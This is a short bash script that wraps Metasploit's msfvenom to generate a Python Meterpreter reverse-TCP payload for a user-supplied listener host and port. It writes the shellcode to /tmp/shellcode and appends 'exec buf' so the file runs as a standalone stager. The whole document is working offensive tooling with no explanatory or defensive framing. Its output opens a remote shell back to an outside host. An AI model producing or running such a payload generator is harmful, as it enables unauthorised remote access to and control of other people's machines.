#!/bin/bash

lhost=""
lport=""
msf="/opt/metasploit-framework/msfvenom"
payload="python/meterpreter/reverse_tcp"

usage() {
    echo "[>] Usage: $0 -l <lhost> -p <lport>"
    exit 1
}

while [ -n "$1" ]; do
    case "$1" in
        -l)
            shift; lhost="$1";;
        -p)
            shift; lport="$1";;
        *)
            echo "[!] Invalid switch"
            usage;;
    esac
    shift
done

[ -z "$lhost" -o -z "$lport" ] && usage

echo "[>] Generating shellcode..."
$msf -p $payload lhost=$lhost lport=$lport -f python -o /tmp/shellcode &>/dev/null
echo "[>] Patching for execution..."
echo "exec buf" >> /tmp/shellcode && echo "[+] Done"
